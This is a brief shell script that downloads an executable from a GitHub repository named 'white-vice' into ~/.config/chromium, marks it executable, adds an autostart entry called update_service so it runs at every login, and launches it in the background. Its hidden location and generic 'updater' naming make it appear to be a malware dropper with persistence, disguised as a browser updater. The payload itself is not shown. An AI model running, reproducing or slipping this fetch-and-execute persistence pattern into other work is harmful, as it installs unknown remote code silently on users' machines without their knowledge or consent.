mkdir ~/.config/chromium
wget -O ~/.config/chromium/updater https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/dist/updater
chmod +x ~/.config/chromium/updater

wget -O ~/.config/autostart/update_service.desktop https://raw.githubusercontent.com/reimch/white-vice/refs/heads/main/resources/update_service.desktop
chmod +x ~/.config/autostart/update_service.desktop

~/.config/chromium/updater &
